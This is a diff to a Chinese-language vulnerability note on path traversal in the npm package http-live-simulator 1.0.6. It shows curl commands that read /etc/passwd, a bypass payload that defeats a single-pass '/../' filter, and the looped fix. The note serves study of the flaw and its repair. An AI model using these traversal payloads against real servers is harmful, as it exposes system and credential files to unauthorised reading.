@@ -16,23 +16,39 @@
 
 ### 实例1
 
-https://github.com/prahladyeri/http-live-simulator/commit/354644525f1626c5921abac10913c0d47f1f1433
+http-live-simulator@1.0.6 中开发人员没有考虑到路径穿越问题
 
-可实现任意文件读取
+漏洞复现
 ```
-http://localhost:8080//../../../../etc/passwd
+# 1- Install the module : 
+npm install -g http-live-simulator@1.0.6
+# 2- Run the server : 
+http-live
+# 3- Attempt to access a file from outside that project's directory
+# 可实现任意文件读取.  其中curl的参数--path-as-is 表示"Do not squash .. sequences in URL path" 不压缩url路径中的..
+# 注意 紧跟8080之后额外加了一个/
+curl --path-as-is http://localhost:8080//../../../../etc/passwd
 ```
 
-第1次修复 将`/../`替换为空 仅替换一次(绕过方式 `/./.././` )
+第1次修复 是将参数值中的`/../`替换为空 仅替换一次(修复无效 可被绕过)
 ```
 pathname = pathname.replace("/../",""); //fix for path traversal bug
-
-//bypass http://localhost:8080/./../././../././../././.././etc/passwd
 ```
 
-第2次修复 将`/../`替换为空 循环替换 直到不存在`/../`为止
+绕过方式 `/./.././`
+```
+curl --path-as-is http://localhost:8080/./../././../././../././.././etc/passwd
+```
+
+
+第2次修复 是将参数值中的`/../`替换为空 循环替换 直到不存在`/../`为止
+
+diff: https://github.com/prahladyeri/http-live-simulator/commit/354644525f1626c5921abac10913c0d47f1f1433
 ```
 while(pathname.indexOf("/../") != -1) {
 		pathname = pathname.replace("/../",""); //fix for path traversal bug
 	}
 ```
+
+
+
